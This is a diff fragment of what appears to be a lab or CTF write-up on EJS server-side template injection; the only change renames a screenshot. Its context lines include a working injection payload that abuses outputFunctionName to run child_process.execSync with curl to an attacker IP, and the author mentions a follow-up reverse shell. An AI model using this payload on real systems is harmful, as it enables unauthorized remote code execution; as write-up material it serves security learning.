@@ -60,7 +60,7 @@ i found this payload to test if we have EJS Server Side Template Injection (SSTI
 name=abc&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://10.14.X.X:8081');s
 ```
 
-![curl](imgs/nmap.png "nmap")
+![curl](imgs/curl.png "curl")
 
 after clicking send we got hit to our server so we might be able to smuggle the reverse shell in tha payload
 
